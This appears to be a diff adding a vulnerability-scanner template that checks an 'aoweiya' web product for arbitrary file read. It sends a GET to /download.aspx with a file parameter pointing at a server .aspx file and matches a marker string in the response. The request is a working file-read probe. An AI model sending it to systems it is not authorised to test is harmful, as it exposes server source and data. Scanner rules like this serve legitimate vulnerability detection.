@@ -1,0 +1,11 @@
+cve-id: aoweiya-download-fileread
+rules:
+- method: GET
+  path: /download.aspx?file=/Tools/AS/ASRoute.aspx
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+    Connection: close
+    Accept-Encoding: gzip, deflate
+  expression: 'response.status == 200 && response.body.bcontains(b"MyAgentServerTestListAgentServer") '
+severity: high
+type: fileread
